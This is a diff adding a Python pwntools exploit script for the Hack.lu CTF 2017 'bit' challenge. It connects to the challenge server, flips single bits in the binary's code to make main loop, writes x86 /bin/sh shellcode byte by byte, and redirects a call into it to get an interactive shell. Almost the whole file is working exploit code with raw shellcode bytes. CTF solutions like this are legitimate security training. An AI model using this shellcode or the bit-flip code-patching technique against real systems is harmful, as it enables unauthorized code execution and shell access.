@@ -1,0 +1,58 @@
+#!/usr/bin/python
+#
+# Hack.lu CTF 2017
+# bit 150 (+100) Points
+# @danigargu
+#
+
+from pwn import *
+
+sc_addr = 0x400580
+
+# x64 /bin/sh shellcode
+shellcode = [
+    0x31, 0xC9, 0xF7, 0xE9, 0x51, 0x04, 0x0B, 0xEB, 0x08, 0x5E, 0x87, 0xE6, 0x99, 0x87, 0xDC, 0xCD,
+    0x80, 0xE8, 0xF3, 0xFF, 0xFF, 0xFF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68, 0x00 
+]
+original_bytes = [
+    0x48, 0x89, 0xE5, 0x76, 0x1B, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x11, 0x5D,
+    0xBF, 0x10, 0x10, 0x60, 0x00, 0xFF, 0xE0, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00 
+]
+
+r = remote('flatearth.fluxfingers.net', 1744)
+
+log.info("Altering main to execute in loop ...")
+r.sendline("0x400714:5")
+
+"""
+0x00400713      e808feffff     call sym.imp.mprotect
+
+After that, the second byte of this call becomes:
+0x8 ^ (1 << 5) = 0x28
+
+And the call points to the entrypoint:
+0x00400713      e828feffff     call entry0 
+"""
+
+for i in range(len(shellcode)):
+	log.info("writing byte: 0x%02x" % shellcode[i])
+	for bit in range(8):
+		if (shellcode[i] & (1 << bit)) != (original_bytes[i] & (1 << bit)):
+			addr_mask = "0x%08x:%d" % (sc_addr, bit)
+			log.info(" -> %s" % addr_mask)
+			r.sendline(addr_mask)
+	sc_addr += 1
+
+log.info("now, jump to shellcode!")
+r.sendline("0x400714:6") # now jmp to shellcode
+
+"""
+0x28 ^ (1 << 6) = 0x68
+
+Now, the call points to the shellcode:
+0x00400713      e868feffff     call 0x400580
+"""
+
+log.info("Got shell? :)")
+r.interactive()
+
